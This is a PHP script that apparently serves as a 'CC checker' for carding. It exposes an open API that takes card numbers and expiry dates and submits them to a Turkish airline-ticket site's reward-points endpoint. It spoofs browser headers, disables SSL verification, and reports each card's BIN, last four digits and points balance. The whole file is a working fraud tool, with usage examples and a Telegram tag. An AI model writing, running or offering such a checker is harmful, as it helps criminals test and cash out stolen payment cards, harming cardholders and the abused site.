<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

class UcakBiletiCCChecker {
    private $apiUrl = "https://www.ucakbileti.com.tr/ajax/check_reward_points";
    
    public function checkCardPoints($cardNumber, $expiryMonth, $expiryYear) {
        // Kart numarasını temizle
        $cleanCardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
        
        // API payload'ı
        $payload = [
            "cardNumber" => $cleanCardNumber,
            "expireMonth" => str_pad($expiryMonth, 2, '0', STR_PAD_LEFT),
            "expireYear" => $expiryYear
        ];
        
        // cURL ile istek gönder
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->apiUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($payload),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept: */*',
                'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding: gzip, deflate, br',
                'Origin: https://www.ucakbileti.com.tr',
                'Referer: https://www.ucakbileti.com.tr/',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'X-Requested-With: XMLHttpRequest'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_ENCODING => 'gzip'
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);
        
        if ($curlError) {
            return [
                'success' => false,
                'error' => 'CURL Error: ' . $curlError,
                'status_code' => $httpCode
            ];
        }
        
        return [
            'success' => true,
            'status_code' => $httpCode,
            'raw_response' => $response,
            'parsed_response' => $this->parseResponse($response)
        ];
    }
    
    private function parseResponse($response) {
        // JSON formatını kontrol et
        $decoded = json_decode($response, true);
        
        if (json_last_error() === JSON_ERROR_NONE) {
            return $decoded;
        }
        
        // HTML response ise parse etmeye çalış
        return $this->parseHTMLResponse($response);
    }
    
    private function parseHTMLResponse($html) {
        // HTML içinden puan bilgisini çıkarmaya çalış
        $patterns = [
            '/puan.*?([0-9]+[.,]?[0-9]*)/i',
            '/points.*?([0-9]+[.,]?[0-9]*)/i',
            '/reward.*?([0-9]+[.,]?[0-9]*)/i',
            '/amount.*?([0-9]+[.,]?[0-9]*)/i',
            '/"amount":\s*"([0-9]+[.,]?[0-9]*)"/i',
            '/"points":\s*"([0-9]+[.,]?[0-9]*)"/i'
        ];
        
        $points = null;
        $currency = 'TRY';
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $html, $matches)) {
                $points = floatval(str_replace(',', '.', $matches[1]));
                break;
            }
        }
        
        return [
            'points' => $points,
            'currency' => $currency,
            'raw_html' => substr($html, 0, 500) // İlk 500 karakter
        ];
    }
    
    public function formatCardNumber($cardNumber) {
        $clean = preg_replace('/[^0-9]/', '', $cardNumber);
        return [
            'raw' => $cardNumber,
            'clean' => $clean,
            'formatted' => implode(' ', str_split($clean, 4)),
            'bin' => substr($clean, 0, 6),
            'last4' => substr($clean, -4)
        ];
    }
    
    public function validateInput($cardNumber, $expiryMonth, $expiryYear) {
        $errors = [];
        
        // Kart numarası validation
        $cleanCard = preg_replace('/[^0-9]/', '', $cardNumber);
        if (strlen($cleanCard) < 15 || strlen($cleanCard) > 16) {
            $errors[] = 'Geçersiz kart numarası';
        }
        
        // Ay validation
        if ($expiryMonth < 1 || $expiryMonth > 12) {
            $errors[] = 'Geçersiz son kullanma ayı';
        }
        
        // Yıl validation
        $currentYear = date('Y');
        if ($expiryYear < $currentYear || $expiryYear > $currentYear + 10) {
            $errors[] = 'Geçersiz son kullanma yılı';
        }
        
        return $errors;
    }
}

// API İsteklerini İşleme
$checker = new UcakBiletiCCChecker();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $cardNumber = $input['card_number'] ?? ($_POST['card_number'] ?? '');
    $expiryMonth = $input['expiry_month'] ?? ($_POST['expiry_month'] ?? '');
    $expiryYear = $input['expiry_year'] ?? ($_POST['expiry_year'] ?? '');
    
    // Input validation
    $validationErrors = $checker->validateInput($cardNumber, $expiryMonth, $expiryYear);
    
    if (!empty($validationErrors)) {
        echo json_encode([
            'success' => false,
            'errors' => $validationErrors
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    // Kart puanını kontrol et
    $result = $checker->checkCardPoints($cardNumber, $expiryMonth, $expiryYear);
    
    // Formatlı kart bilgisi
    $cardInfo = $checker->formatCardNumber($cardNumber);
    
    // Sonuçları birleştir
    $finalResult = [
        'success' => $result['success'],
        'card_info' => $cardInfo,
        'status_code' => $result['status_code'],
        'checked_at' => date('Y-m-d H:i:s'),
         'telegram' => ('unutur'),
        'api_response' => $result['parsed_response']
    ];
    
    if (!$result['success']) {
        $finalResult['error'] = $result['error'];
    }
    
    echo json_encode($finalResult, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // GET isteği için bilgi sayfası
    $exampleData = [
        'card_number' => '4543601234567890',
        'expiry_month' => '12',
        'expiry_year' => '2025'
    ];
    
    echo json_encode([
        'message' => 'CC Puan Checker API',
        'version' => '1.0',
        'endpoint' => 'POST /',
        'parameters' => [
            'card_number' => 'Kart numarası (16 haneli)',
            'expiry_month' => 'Son kullanma ayı (1-12)',
            'expiry_year' => 'Son kullanma yılı (2024-2030)'
        ],
        'example' => $exampleData,
        'usage' => [
            'curl' => 'curl -X POST -H "Content-Type: application/json" -d \'' . json_encode($exampleData) . '\' ' . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
            'javascript' => 'fetch("' . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(' . json_encode($exampleData) . ')})'
        ]
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?>